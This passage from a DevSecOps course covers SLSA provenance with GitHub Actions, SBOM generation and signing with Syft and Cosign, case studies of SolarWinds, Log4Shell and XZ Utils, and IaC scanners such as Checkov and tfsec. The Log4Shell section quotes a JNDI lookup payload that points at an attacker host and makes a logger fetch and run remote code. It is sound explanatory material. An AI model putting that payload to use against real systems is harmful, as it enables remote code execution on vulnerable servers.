- Source code is immutable — the exact commit that was used is pinned
- Value: You can verify *how* the binary was built — reducing the risk of tampering inside the CI system

**SLSA Level 4: Two-Party Review + Hermetic Reproducible Builds**
- All source code changes require review by two people
- Builds are reproducible — the same source produces byte-for-byte identical output
- The full build process, including dependencies, is hermetically isolated
- Value: Maximum supply chain assurance — nearly impossible to compromise without detection

Most organisations target **SLSA Level 2** as their baseline and Level 3 for critical software.

### Understanding Provenance

**Provenance** is the documented history of a software artifact — where it came from and how it was created. Think of it like a certificate of authenticity for your software:

```json
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "subject": [
    {
      "name": "myapp:1.0.0",
      "digest": {
        "sha256": "a3b8c7d4e5f6..."
      }
    }
  ],
  "predicate": {
    "builder": {
      "id": "https://github.com/actions/runner"
    },
    "buildType": "https://github.com/slsa-framework/slsa-github-generator",
    "invocation": {
      "configSource": {
        "uri": "git+https://github.com/org/myapp@refs/heads/main",
        "digest": {
          "sha1": "abc123..."
        },
        "entryPoint": ".github/workflows/release.yml"
      }
    },
    "buildConfig": {},
    "materials": [
      {
        "uri": "git+https://github.com/org/myapp",
        "digest": {
          "sha1": "abc123..."
        }
      }
    ]
  }
}
```

This provenance document says: "The artifact `myapp:1.0.0` with hash `a3b8c7d4e5f6...` was built by GitHub Actions from commit `abc123` of the repository `https://github.com/org/myapp`."

### Achieving SLSA Level 2 with GitHub Actions

GitHub Actions is a SLSA Level 2 compliant build platform. The `slsa-framework/slsa-github-generator` action generates and signs provenance automatically.

**SLSA Level 2 workflow for a Go binary:**

```yaml
# .github/workflows/slsa-release.yml

name: SLSA Level 2 Release

on:
  push:
    tags:
      - 'v*'   # Run when a tag like v1.0.0 is pushed

jobs:
  # Job 1: Build the binary
  build:
    runs-on: ubuntu-latest
    outputs:
      hashes: ${{ steps.hash.outputs.hashes }}
      # Outputs the SHA-256 hashes of the built artifacts
      # These hashes are used in the provenance

    steps:
      - uses: actions/checkout@v4

      - name: Build binary
        run: |
          go build -o myapp-linux-amd64 .
          # Build the Go binary for Linux AMD64

      - name: Generate SHA-256 hashes
        id: hash
        run: |
          sha256sum myapp-linux-amd64 > checksums.txt
          echo "hashes=$(cat checksums.txt | base64 -w0)" >> $GITHUB_OUTPUT
          # Generate SHA-256 hash of the binary
          # base64 encode it and save as a job output

      - name: Upload binary
        uses: actions/upload-artifact@v4
        with:
          name: binary
          path: myapp-linux-amd64

  # Job 2: Generate SLSA provenance
  provenance:
    needs: [build]
    # This job runs after the build job completes

    permissions:
      actions: read
      # Required to read workflow run information
      id-token: write
      # Required to request an OIDC token (used to sign the provenance)
      contents: write
      # Required to upload provenance to GitHub releases

    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.9.0
    # This reusable workflow generates and signs the provenance
    with:
      base64-subjects: "${{ needs.build.outputs.hashes }}"
      # The hashes of the artifacts we want to attest to
      upload-assets: true
      # Upload the provenance to the GitHub release
```

Every section explained:
- `build` job — compiles the application and generates SHA-256 hashes of the output
- `steps.hash.outputs.hashes` — the hash values are passed between jobs
- `provenance` job — uses a reusable GitHub Actions workflow that generates and signs SLSA provenance
- `permissions` — the exact permissions needed for the provenance generator to work
- `id-token: write` — allows the workflow to request an OIDC token, which is used to cryptographically sign the provenance
- `uses: slsa-framework/slsa-github-generator` — the official SLSA generator

**Verifying provenance with slsa-verifier:**

```bash
# Install slsa-verifier
go install github.com/slsa-framework/slsa-verifier/v2/cli/slsa-verifier@latest

# Verify the provenance of a binary
slsa-verifier verify-artifact myapp-linux-amd64 \
  --provenance-path myapp-linux-amd64.intoto.jsonl \
  --source-uri github.com/org/myapp \
  --source-tag v1.0.0

# This command verifies:
# 1. The provenance file is properly signed
# 2. The binary hash matches what's in the provenance
# 3. The source repository and tag match what's claimed
# 4. The build was performed by GitHub Actions (not a local machine)
```

**For container images, use Cosign:**

```bash
# Install cosign
go install github.com/sigstore/cosign/v2/cmd/cosign@latest

# Sign a container image
cosign sign --key cosign.key ghcr.io/org/myapp:v1.0.0

# Verify a signed image
cosign verify --key cosign.pub ghcr.io/org/myapp:v1.0.0

# Sign with keyless signing (using GitHub Actions OIDC - no key management needed)
cosign sign --yes ghcr.io/org/myapp:v1.0.0
# In GitHub Actions, this is handled automatically via OIDC
```

### Common Beginner Mistakes

**Mistake 1: Confusing signing and provenance.**
Signing a binary proves it hasn't been tampered with *after* it was created. Provenance proves *how* it was created. Both are needed for full supply chain security.

**Mistake 2: Generating provenance but not verifying it.**
Provenance is useless if nothing checks it before deployment. Integrate provenance verification into your deployment pipeline.

**Mistake 3: Building locally instead of in CI.**
Builds done on developer machines cannot achieve SLSA Level 2 because there's no trusted build platform. All production builds should happen in CI.

**Mistake 4: Pinning by tag instead of commit hash.**
In your CI workflows, always pin third-party actions by their commit hash, not their tag:

```yaml
# BAD: tags can be moved (a compromised maintainer can point v4 to malicious code)
uses: actions/checkout@v4

# GOOD: commit hashes are immutable
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

### How This Works in the Real World

Google, Microsoft, and AWS all produce SLSA-compliant artifacts for their own tooling. The SLSA framework is increasingly being required by government procurement — the US Executive Order on Cybersecurity specifically calls for software provenance.

For enterprise software vendors, SLSA compliance is becoming a competitive differentiator — customers ask "can you prove this binary came from your source code and wasn't tampered with?"

### Key Takeaways

- SLSA is a framework for protecting the build process and generating provenance for software artifacts
- SLSA Levels 1–4 provide increasing guarantees about build integrity
- Provenance is a signed, machine-readable document proving what source code produced a specific binary
- GitHub Actions natively supports SLSA Level 2 via the `slsa-github-generator` action
- Cosign is used to sign container images and verify them before deployment
- Always pin CI actions by commit hash, not tag

### Practical Task: Achieve SLSA Level 2 — Signed Builds with Provenance, Hermetic Builds in CI

**Task:**

1. Create a simple Go application (or Python application)
2. Set up a GitHub Actions release workflow that:
   - Builds the application binary
   - Generates SHA-256 hashes of the output
   - Uses `slsa-github-generator` to generate and sign SLSA provenance
   - Uploads the binary and provenance to a GitHub Release
3. Install `slsa-verifier` locally
4. Download the binary and provenance from the GitHub Release
5. Run `slsa-verifier verify-artifact` to verify the provenance
6. Document what SLSA Level 2 guarantees and what it does not guarantee
7. **Bonus:** Build and push a Docker image for the application; sign it with Cosign using keyless signing in GitHub Actions; verify the signature locally

**Expected output:** A GitHub repository with a SLSA Level 2 release workflow, a verified provenance document, `slsa-verifier` output confirming successful verification, and a written explanation of the trust guarantees SLSA Level 2 provides.

---

## Chapter 8: SBOM — Software Bill of Materials {#chapter-8}

### The Ingredient List for Software

When you buy packaged food, the ingredient list tells you exactly what's inside. You can see if something contains peanuts (allergy concern), high-fructose corn syrup (health concern), or ingredients sourced from sanctioned countries (regulatory concern). Without an ingredient list, you'd have to guess.

A **Software Bill of Materials (SBOM)** is the ingredient list for software. It's a formal, machine-readable document that lists every component that makes up a piece of software:
- Open-source libraries and their versions
- Operating system packages
- Programming language runtimes
- Compiled binaries included in the application

When Log4Shell was disclosed in December 2021, organisations scrambled to answer one question: "Do we use Log4j, and if so, where?" Those with SBOMs could query their inventory and answer in minutes. Those without had to manually audit dozens of repositories — a process that took days or weeks.

### Why SBOMs Matter

SBOMs serve multiple purposes:

1. **Vulnerability response:** When a critical CVE is published, you need to know within hours whether your software is affected. An SBOM makes this a query, not an audit.

2. **License compliance:** Open-source licenses have requirements. A GPL-licensed component may require you to release your own source code. An SBOM enables licence auditing.

3. **Regulatory compliance:** The US Executive Order 14028 (2021) requires SBOMs for software sold to the US government. EU regulations are moving in the same direction.

4. **Software supply chain transparency:** Customers increasingly ask vendors for SBOMs to assess their security risk.

### SBOM Formats: CycloneDX and SPDX

Two formats dominate the SBOM landscape:

**CycloneDX:**
- Developed by OWASP
- Focused on security use cases
- Supports vulnerability data natively
- JSON and XML formats
- Preferred by security tools (Dependency-Track, Trivy)

**SPDX (Software Package Data Exchange):**
- Developed by the Linux Foundation
- Older, more established standard
- Originally focused on license compliance
- JSON, YAML, and tag-value text formats
- Preferred by legal/compliance teams

Both formats are widely supported. For security-focused SBOMs, use CycloneDX. For license compliance, SPDX is more common.

### Tool: Syft

**Syft** (by Anchore, the same team as Grype) is the leading open-source SBOM generator. It can generate SBOMs for:
- Container images
- Local directories
- File systems
- Archives (tar.gz, zip)

**Installation:**
```bash
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin
```

**Generating an SBOM for a container image:**
```bash
# Generate SBOM in CycloneDX JSON format
syft nginx:1.25.0 -o cyclonedx-json=sbom.cyclonedx.json

# Generate SBOM in SPDX JSON format
syft nginx:1.25.0 -o spdx-json=sbom.spdx.json

# Generate SBOM in human-readable table format
syft nginx:1.25.0 -o table

# Flags:
# -o cyclonedx-json = output format and filename
# -o spdx-json      = SPDX format
# -o table          = human-readable (for development/review)
```

**Generating an SBOM for a directory (source code):**
```bash
# Scan the current directory
syft dir:. -o cyclonedx-json=sbom-source.json

# Scan and include development dependencies
syft dir:. --scope all-layers -o cyclonedx-json=sbom-full.json
```

**Reading an SBOM:**

A CycloneDX SBOM looks like this (simplified):
```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "version": 1,
  "metadata": {
    "timestamp": "2024-01-15T10:30:00Z",
    "component": {
      "type": "container",
      "name": "myapp",
      "version": "1.0.0"
    }
  },
  "components": [
    {
      "type": "library",
      "name": "flask",
      "version": "2.3.3",
      "purl": "pkg:pypi/flask@2.3.3",
      "licenses": [{ "license": { "id": "BSD-3-Clause" } }]
    },
    {
      "type": "library",
      "name": "requests",
      "version": "2.31.0",
      "purl": "pkg:pypi/requests@2.31.0",
      "licenses": [{ "license": { "id": "Apache-2.0" } }]
    }
  ]
}
```

Key fields:
- `bomFormat` — identifies this as a CycloneDX SBOM
- `metadata.component` — the software being described (the "product")
- `components` — every dependency found
- `purl` — Package URL, a universal identifier for packages (e.g., `pkg:pypi/flask@2.3.3` = Flask version 2.3.3 from PyPI)
- `licenses` — the licence(s) of this component

### Signing SBOMs with Cosign

Generating an SBOM is useful. Signing it is essential — it proves the SBOM itself hasn't been tampered with and that it was produced by your official build process.

```bash
# Generate the SBOM
syft myapp:1.0.0 -o cyclonedx-json=sbom.json

# Sign and attach the SBOM to the container image in the registry
cosign attach sbom --sbom sbom.json myapp:1.0.0

# Verify the SBOM signature
cosign verify-attestation --type cyclonedx myapp:1.0.0
```

**Complete CI/CD workflow for SBOM generation and signing:**

```yaml
# .github/workflows/sbom.yml

name: Generate and Sign SBOM

on:
  push:
    branches: [main]

jobs:
  build-and-sbom:
    name: Build, SBOM, and Sign
    runs-on: ubuntu-latest

    permissions:
      contents: read
      packages: write
      # Permission to push to GitHub Container Registry
      id-token: write
      # Permission for keyless Cosign signing via OIDC

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Login to GitHub Container Registry
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push Docker image
        id: build
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}

      - name: Install Syft
        uses: anchore/sbom-action/download-syft@v0

      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          image: ghcr.io/${{ github.repository }}:${{ github.sha }}
          format: cyclonedx-json
          output-file: sbom.cyclonedx.json
          # Generates the SBOM for the container image we just built

      - name: Install Cosign
        uses: sigstore/cosign-installer@v3

      - name: Sign image with Cosign
        run: |
          cosign sign --yes ghcr.io/${{ github.repository }}:${{ github.sha }}
          # --yes = skip confirmation prompt
          # Uses GitHub Actions OIDC for keyless signing

      - name: Attach SBOM to image
        run: |
          cosign attach sbom \
            --sbom sbom.cyclonedx.json \
            ghcr.io/${{ github.repository }}:${{ github.sha }}
          # Attaches the SBOM to the container image in the registry

      - name: Upload SBOM as artifact
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.cyclonedx.json
```

### Storing and Consuming SBOMs

Generating SBOMs is step one. Step two is having a system to store and query them.

**Dependency-Track** (by OWASP) is the leading open-source SBOM management platform:

```bash
# Start Dependency-Track with Docker Compose
docker compose up -d
# Once running, access the UI at http://localhost:8080

# Upload an SBOM via the API
curl -X POST \
  http://localhost:8080/api/v1/bom \
  -H "X-Api-Key: your-api-key" \
  -H "Content-Type: multipart/form-data" \
  -F "project=my-project" \
  -F "version=1.0.0" \
  -F "bom=@sbom.cyclonedx.json"
```

Dependency-Track will:
- Store the SBOM
- Check all components against vulnerability databases
- Alert you when new CVEs affect your components
- Track component usage across all your projects
- Generate licence compliance reports

### Common Beginner Mistakes

**Mistake 1: Generating SBOMs only for the application, not the container.**
The container image contains OS packages, runtime libraries, and your application. An SBOM that only covers your Python code misses the Debian packages with their own CVEs.

**Mistake 2: Generating SBOMs at the wrong time.**
Generate the SBOM from the final build artifact (the container image) not from the source code. The SBOM should reflect exactly what is deployed, including all resolved transitive dependencies.

**Mistake 3: Not storing SBOMs long-term.**
SBOMs should be stored for as long as the software is deployed. When a CVE is published six months from now, you need the SBOM from the version you deployed six months ago.

**Mistake 4: Not signing SBOMs.**
An unsigned SBOM could be tampered with — someone could remove a vulnerable component from the list. Always sign SBOMs with Cosign or similar tools.

### How This Works in the Real World

Major software vendors (Microsoft, Red Hat, Google) now publish SBOMs for their products. The US Cybersecurity and Infrastructure Security Agency (CISA) publishes guidance on SBOM best practices. For organisations selling to the US Federal Government, providing an SBOM is a contractual requirement under Executive Order 14028.

In enterprise environments, every CI/CD pipeline that produces a deployable artifact also produces and signs an SBOM. These SBOMs are stored in a centralised platform like Dependency-Track, which continuously monitors for new CVEs and generates automated reports for security and compliance teams.

### Key Takeaways

- An SBOM is a machine-readable list of every component in a piece of software
- SBOMs enable rapid vulnerability response (knowing in minutes whether you're affected by a new CVE)
- CycloneDX and SPDX are the two dominant SBOM formats — CycloneDX for security, SPDX for licensing
- Syft is the leading open-source SBOM generator, supporting containers and directories
- Sign SBOMs with Cosign and attach them to container images in the registry
- Dependency-Track is the leading platform for storing, analysing, and querying SBOMs
- SBOMs are becoming a regulatory requirement in the US and EU

### Practical Task: Generate and Sign an SBOM for Every Docker Image in Your Pipeline Using Syft and Cosign

**Task:**

1. Build a multi-container application with at least two services (e.g., a Python API and a Node.js frontend)
2. Set up a GitHub Actions workflow that for each service:
   - Builds the Docker image
   - Pushes it to GitHub Container Registry (ghcr.io)
   - Uses `anchore/sbom-action` to generate a CycloneDX JSON SBOM
   - Signs the image with Cosign (keyless signing via OIDC)
   - Attaches the SBOM to the image using `cosign attach sbom`
   - Uploads the SBOM as a workflow artifact
3. Verify the signatures: `cosign verify ghcr.io/yourrepo/yourimage:sha`
4. Run Grype against both SBOMs: `grype sbom:sbom.cyclonedx.json`
5. Document the component counts (how many packages in each image)
6. Identify the top three highest-severity CVEs found by Grype in your SBOMs
7. **Bonus:** Set up a local Dependency-Track instance and upload both SBOMs

**Expected output:** A pipeline that generates, signs, and attaches SBOMs for every image build, verified Cosign signatures, Grype scan output from the SBOMs, and a written summary of key components found.

---

## Chapter 9: Supply Chain Attacks — SolarWinds, Log4Shell, and Mitigation Strategies {#chapter-9}

### Understanding the Attack Category

We've talked about protecting your own code. But what about the code that protects you? What if your security scanner was compromised? What if the CI/CD tool you trust was injecting malicious code into your builds? What if a library used by millions of developers was backdoored?

These are **supply chain attacks** — attacks that target the *components, processes, and tools* that go into building software, rather than attacking the final product directly.

It's the difference between:
- **Direct attack:** Breaking into the bank vault
- **Supply chain attack:** Compromising the company that manufactures the vault, so that every vault they sell has a hidden backdoor

Supply chain attacks are particularly insidious because:
- They exploit *trust* — you trust your build tools, your dependencies, your vendors
- They affect everyone downstream — compromising one vendor can compromise thousands of their customers
- They're often hard to detect — the attack lives in trusted code

### Case Study 1: SolarWinds (2020)

**What happened:**
SolarWinds is a software company that makes IT management tools, including a product called Orion. Approximately 33,000 organisations, including US government agencies, used Orion.

In 2019 or early 2020, attackers — later attributed to Russian intelligence (SVR/Cozy Bear) — gained access to SolarWinds' build environment. They modified the build process to inject a small piece of malicious code into the Orion software update.

In March 2020, SolarWinds pushed an update to Orion. This update was digitally signed by SolarWinds' own certificate — it looked completely legitimate. About 18,000 organisations installed it.

The malicious code (known as SUNBURST) lay dormant for two weeks after installation, then began connecting to attacker-controlled servers and establishing backdoors. The attackers then selectively targeted high-value organisations (US Treasury, Department of Homeland Security, Microsoft, FireEye) for deeper compromise.

The attack wasn't detected until December 2020 — eight to nine months after deployment.

**Key lessons:**
- Code signing alone is insufficient — the signature only proves who signed it, not that the code is clean
- Build system access is equivalent to source code access
- Software updates are a highly trusted attack vector
- Hermetic builds (SLSA Level 3+) would have made this attack much harder
- SBOMs would have enabled faster detection and scoping

**What defences would have helped:**
- SLSA Level 3: hermetic builds that don't allow unexpected code injection
- Binary signing with provenance: the signature would need to match the expected build environment
- Reproducible builds: independent parties could verify the binary matched the source
- Behavioural monitoring: the SUNBURST dormancy period followed by unexpected network connections should have triggered alerts

### Case Study 2: Log4Shell (CVE-2021-44228) — December 2021

**What happened:**
Log4j is a Java logging library. It's used by an enormous number of Java applications — not always deliberately; it's often included as a transitive dependency several levels deep.

In December 2021, security researcher Chen Zhaojun of Alibaba Cloud discovered a critical vulnerability in Log4j 2.x. The vulnerability was so severe that it received a CVSS score of 10.0 — the maximum possible.

The vulnerability: Log4j supports a feature called "message lookup substitution." When it logs a string, it processes certain patterns in that string. For example, logging the string `${java:version}` would be replaced with the Java version. The vulnerability allowed an attacker to include `${jndi:ldap://attacker.com/exploit}` in any input that would be logged. Log4j would then make an LDAP connection to the attacker's server and execute whatever code it retrieved.

The attack was triggered by logging. Any user input that gets logged is a potential attack vector. Web server logs, user-agent strings, search queries, login attempt logs — all of these could contain the payload.

Exploitation required no authentication. The attack was trivially simple. Within days of disclosure, it was being exploited by ransomware groups, cryptocurrency miners, and nation-state actors.

**The scope:** Because Log4j is so widely used as a transitive dependency, the blast radius was enormous. Companies spent days or weeks just inventorying whether they used Log4j — and where.

**Key lessons:**
- Transitive dependencies are invisible risk. Log4j was used by millions of applications whose developers had never heard of it.
- SBOM adoption would have made vulnerability scoping instant instead of days-long
- Automatic scanning for new CVEs against your installed versions is essential
- Vulnerable component updates must be treated as P0 emergencies

**Mitigation applied in industry:**
- Emergency patching of Log4j to 2.15.0 and then 2.17.0 (subsequent bypasses were found)
- WAF rules to block JNDI lookup strings in input
- SCA scanning to find all uses of Log4j across all repositories
- Dependency-Track and similar tools to monitor for future disclosures against known components

### Case Study 3: XZ Utils Backdoor (2024)

**What happened:**
This case is particularly instructive for understanding social engineering in open-source supply chain attacks.

Over approximately two years (2021–2024), a malicious actor operating under the pseudonym "Jia Tan" gradually contributed increasingly high-quality code to XZ Utils — a data compression library used in most Linux distributions. Through patient, sustained contribution and social pressure on the maintainer (who appeared to be under significant stress), Jia Tan eventually gained write access to the repository.

In late 2024, Jia Tan introduced a carefully hidden backdoor into XZ Utils 5.6.0 and 5.6.1. The backdoor was deeply obfuscated and targeted systemd-using systems, specifically injecting malicious code into SSH authentication. On affected systems, the backdoor would allow certain cryptographic keys (presumably held by the attacker) to authenticate as any user without a password.

The attack was discovered before wide distribution by Andres Freund, a Microsoft engineer who noticed unexpectedly high CPU usage when testing SSH connections on a Debian machine with the new XZ version. A chance observation during performance testing caught an extremely sophisticated attack.

**Key lessons:**
- Open-source maintainer burnout creates security vulnerabilities — healthy, supported maintainers are a security property
- Long-term, patient social engineering is a serious supply chain attack vector
- Code review must cover the build scripts and autoconf files, not just the C code
- Community health and diversity in maintainership are security properties

### Broader Supply Chain Attack Categories

Beyond these specific cases, supply chain attacks occur via:

**1. Dependency Confusion Attacks**
Attackers publish malicious packages to public repositories (npm, PyPI) with the same names as *internal* private packages, relying on package managers preferring public versions.

```bash
# Defence: Pin exact versions and hashes in requirements files
# In requirements.txt:
flask==2.3.3 --hash=sha256:f2fb4f891...

# In package.json:
# Use npm ci (not npm install) in CI - reads exact package-lock.json versions
npm ci
```

**2. Typosquatting**
Attackers publish packages with names similar to popular packages (`reqquests` instead of `requests`). Developers make typos.

Defence: Use verified package names, configure registry URL explicitly:
```bash
# Configure pip to only use the official PyPI
pip config set global.index-url https://pypi.org/simple/

# Configure npm with a verified registry
npm config set registry https://registry.npmjs.org/
```

**3. Compromised CI/CD Credentials**
Attackers gain access to CI tokens or credentials and use them to modify build pipelines.

Defence:
- Principle of least privilege on CI tokens
- Audit CI token usage
- Use OIDC-based authentication (no long-lived secrets) where possible
- Implement branch protection rules so CI configuration cannot be modified without review

**4. Malicious GitHub Actions**
An action you use in your CI pipeline could be compromised.

Defence: Pin all actions by commit hash, not tag:
```yaml
# BAD: tag can be updated to point to malicious code
uses: some-action/checkout@v2

# GOOD: commit hash is immutable
uses: some-action/checkout@a12a394be99286d0969990e2dd4f4ea7d8f91...
```

### A Comprehensive Mitigation Strategy

Based on these lessons, here is a layered supply chain defence:

**Layer 1: Visibility**
- Generate SBOMs for every artifact
- Run SCA on all dependencies continuously
- Maintain an inventory of all CI/CD tools and their versions

**Layer 2: Verification**
- Require cryptographic verification of all installed packages
- Pin dependencies to exact versions with hash verification
- Implement SLSA Level 2+ for your own builds
- Verify provenance of third-party artifacts where available

**Layer 3: Hardening**
- Use hermetic builds (SLSA Level 3)
- Apply least privilege to all CI/CD credentials
- Pin all GitHub Actions to commit hashes
- Use distroless/minimal base images

**Layer 4: Detection**
- Runtime behavioural monitoring (Falco, AWS GuardDuty)
- Automated alerts for new CVEs against your SBOM components
- Anomaly detection on CI pipeline behaviour
- Regular third-party penetration testing of CI/CD infrastructure

**Layer 5: Response**
- Defined SLA for critical CVE remediation
- Runbooks for supply chain incident response
- Regular exercises (tabletop simulations of supply chain attack scenarios)
- Clear escalation paths

### Common Beginner Mistakes

**Mistake 1: Assuming trusted sources are safe.**
Signed software from a trusted vendor means the vendor signed it — it doesn't mean the software is clean. SolarWinds was signed. Verify what you can (provenance, SBOM, behaviour), not just who signed it.

**Mistake 2: Only protecting your code, not your build system.**
The build system is part of your supply chain. Protect it with the same rigour as your application code. Audit CI configuration changes. Restrict who can modify CI pipelines.

**Mistake 3: Not having an SBOM when a CVE is published.**
When Log4Shell hit, organisations without SBOMs spent days answering "are we affected?" If your security posture isn't built before the crisis, you'll build it during the crisis — under pressure, with incomplete information.

### How This Works in the Real World

After SolarWinds, the US government published a comprehensive set of software supply chain security requirements under Executive Order 14028. The NIST SP 800-218 framework (Secure Software Development Framework) and the CISA guidance on SBOM are now informing procurement decisions.

Enterprise security teams now include "supply chain risk management" as a dedicated function. This involves:
- Assessing the security practices of critical vendors
- Requiring SBOMs from vendors
- Running SCA against vendor-provided software
- Monitoring vendor security advisories

### Key Takeaways

- Supply chain attacks target the components, tools, and processes used to build software rather than the software itself
- SolarWinds showed that compromising a build system can silently distribute malware to thousands of customers
- Log4Shell demonstrated the enormous risk of untracked transitive dependencies — SBOMs are essential for rapid response
- XZ Utils showed that sophisticated, long-term social engineering of open-source maintainers is a real threat
- Defence requires visibility (SBOMs, SCA), verification (provenance, SLSA), hardening (hermetic builds, pinned dependencies), and detection (runtime monitoring, CVE alerts)

### Practical Task: Supply Chain Threat Model

This chapter's task is a design and analysis exercise rather than a technical implementation, because understanding the threat landscape is as important as implementing the tools.

**Task:**

1. Choose a realistic application architecture: a web application with three services (frontend, backend API, PostgreSQL database), built with GitHub Actions, deployed to AWS ECS via Terraform
2. Draw a complete supply chain map including: source code, CI/CD pipeline, container registry, deployment tooling, runtime dependencies, and infrastructure
3. For each node in the supply chain map, write a threat analysis using STRIDE:
   - What could be tampered with here?
   - What credentials or access controls protect this node?
   - What happens if this node is compromised?
4. Select three supply chain attack scenarios from this chapter and describe:
   - How the attack would manifest on your specific architecture
   - Which existing controls would detect it (if any)
   - Which SLSA level would mitigate it
   - What specific tooling from this course would have prevented or detected it
5. Write a prioritised remediation roadmap — which mitigations give the highest return first?

**Expected output:** A supply chain threat model document with a visual map, STRIDE analysis per node, three detailed attack scenario analyses, and a prioritised remediation roadmap. This type of document is produced regularly by security architects at cloud-native organisations.

---

## Chapter 10: Infrastructure Security Scanning {#chapter-10}

### Infrastructure as Code Is Code — And Code Has Bugs

Infrastructure as Code (IaC) — using Terraform, CloudFormation, Pulumi, Helm charts, and Kubernetes manifests to define and provision cloud resources — is one of the most powerful advances in DevOps. Instead of clicking through cloud consoles, you write code that describes your infrastructure, commit it to Git, and let CI/CD apply it.

But infrastructure code has security implications just like application code. An S3 bucket configured with public read access in Terraform is a data breach waiting to happen. A security group that opens port 22 to `0.0.0.0/0` exposes your EC2 instances to SSH brute-force from the entire internet.

**Infrastructure security scanning** analyses IaC files before they're applied — catching misconfigurations at the "blueprint" stage, before a single real cloud resource is created.

This is shift-left applied to infrastructure: find the misconfiguration in the Terraform plan, not in the Cloud Security Posture Management (CSPM) tool that scans your live environment six hours after the resource was created.

### Tool 1: Checkov

**Checkov** (by Bridgecrew/Palo Alto Networks) is the most widely used open-source IaC security scanner. It supports:
- Terraform (`.tf` files)
- CloudFormation (YAML/JSON templates)
- Kubernetes manifests
- Dockerfiles
- GitHub Actions workflows
- Helm charts

**Installation:**
```bash
pip install checkov
```

**Running Checkov on Terraform:**
```bash
# Scan the current directory for Terraform files
checkov -d .

# Scan a specific file
checkov -f main.tf

# Only show FAILED checks
checkov -d . --compact

# Output as JSON
checkov -d . -o json > checkov-results.json

# Fail on HIGH severity findings
checkov -d . --check HIGH

# Skip specific checks (with documented justification)
checkov -d . --skip-check CKV_AWS_18,CKV_AWS_19
# Document each skipped check in your security exceptions register
```

**Checkov output example:**
```
Check: CKV_AWS_18: "Ensure the S3 bucket has access logging enabled"
FAILED for resource: aws_s3_bucket.data_bucket
File: /terraform/storage.tf:1-15

        1 | resource "aws_s3_bucket" "data_bucket" {
        2 |   bucket = "my-data-bucket"
        3 |   # No access logging configured
        4 | }

Check: CKV_AWS_19: "Ensure all data stored in the S3 bucket is securely encrypted"
FAILED for resource: aws_s3_bucket.data_bucket
File: /terraform/storage.tf:1-15
```

**Fixing the findings:**
```hcl
# Before (insecure)
resource "aws_s3_bucket" "data_bucket" {
  bucket = "my-data-bucket"
}

# After (Checkov-compliant)
resource "aws_s3_bucket" "data_bucket" {
  bucket = "my-data-bucket"
}

# Enable server-side encryption
resource "aws_s3_bucket_server_side_encryption_configuration" "data_bucket_sse" {
  bucket = aws_s3_bucket.data_bucket.id

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
      # Use AWS KMS for encryption (stronger than AES256)
    }
  }
}

# Enable access logging
resource "aws_s3_bucket_logging" "data_bucket_logging" {
  bucket = aws_s3_bucket.data_bucket.id

  target_bucket = aws_s3_bucket.log_bucket.id
  # Log access events to a separate logging bucket
  target_prefix = "data-bucket-logs/"
}

# Block all public access
resource "aws_s3_bucket_public_access_block" "data_bucket_public_access" {
  bucket = aws_s3_bucket.data_bucket.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
  # All four settings must be true to fully block public access
}
```

**Checkov in GitHub Actions:**
```yaml
# .github/workflows/checkov.yml

name: Infrastructure Security Scan

on:
  pull_request:
    paths:
      - 'terraform/**'
      # Only run when Terraform files are changed

jobs:
  checkov:
    name: Checkov IaC Scan
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Run Checkov
        uses: bridgecrewio/checkov-action@master
        with:
          directory: terraform/
          framework: terraform
          output_format: sarif
          output_file_path: checkov-results.sarif
          soft_fail: false
          # soft_fail: false = fail the build if any check fails

      - name: Upload Checkov results to GitHub Security tab
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: checkov-results.sarif
```

### Tool 2: tfsec

**tfsec** is a Terraform-specific security scanner focused entirely on Terraform HCL files. It's faster than Checkov for pure Terraform use cases.

```bash
# Installation
brew install tfsec
# or
go install github.com/aquasecurity/tfsec/cmd/tfsec@latest

# Basic scan
tfsec .

# Only show HIGH and CRITICAL
tfsec . --minimum-severity HIGH

# Output as JSON
tfsec . --format json --out tfsec-results.json

# Run with custom checks
tfsec . --custom-check-dir ./custom-checks

# Ignore a specific issue inline
# Add a comment in your Terraform file:
resource "aws_security_group" "web" {
  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  #tfsec:ignore:aws-ec2-no-public-ingress-sgr
    # The above comment tells tfsec to ignore this specific line
    # ALWAYS document WHY: public HTTPS is intentional for a web server
  }
}
```

### Tool 3: KICS (Keeping Infrastructure as Code Secure)

**KICS** (by Checkmarx) supports the widest range of IaC formats of any open-source tool:
- Terraform
- Kubernetes
- Docker Compose
- CloudFormation
- Ansible
- ARM templates (Azure)
- Helm
- Pulumi

```bash
# Installation via Docker
docker pull checkmarx/kics:latest

# Run a scan
docker run -t \
  -v $(pwd):/path \
  checkmarx/kics scan \
  -p /path \
  -o /path/kics-results.json \
  --report-formats json,html

# The flags:
# -p    = path to scan
# -o    = output directory
# --report-formats = output format(s)
```

### Tool 4: Terrascan

**Terrascan** (by Tenable) is another open-source IaC scanner with built-in policies for AWS, Azure, GCP, and Kubernetes:

```bash
# Installation
brew install terrascan

# Scan Terraform
terrascan scan -t terraform -d ./terraform

# Scan Kubernetes manifests
terrascan scan -t k8s -d ./kubernetes

# Scan with a specific policy set
terrascan scan -t terraform --policy-type aws -d ./terraform

# Output as JSON
terrascan scan -t terraform -d ./terraform -o json > terrascan-results.json
```

### Kubernetes Security Scanning

For Kubernetes manifests and Helm charts, there are dedicated tools:

**kube-score:**
